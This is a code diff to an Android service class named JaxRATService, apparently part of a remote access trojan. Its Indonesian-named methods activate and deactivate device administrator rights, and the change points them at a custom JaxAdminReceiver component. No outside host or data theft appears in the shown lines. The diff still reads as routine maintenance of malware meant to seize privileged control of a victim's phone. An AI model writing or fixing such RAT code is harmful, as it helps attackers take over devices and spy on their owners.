@@ -145,7 +145,7 @@ public class JaxRATService extends Service {
     }
 
     private void aktifkanAdmin() {
-        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
+        ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         
         if (!dpm.isAdminActive(adminComponent)) {
@@ -158,7 +158,7 @@ public class JaxRATService extends Service {
     }
 
     private void matikanAdmin() {
-        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
+        ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         
         if (dpm.isAdminActive(adminComponent)) {
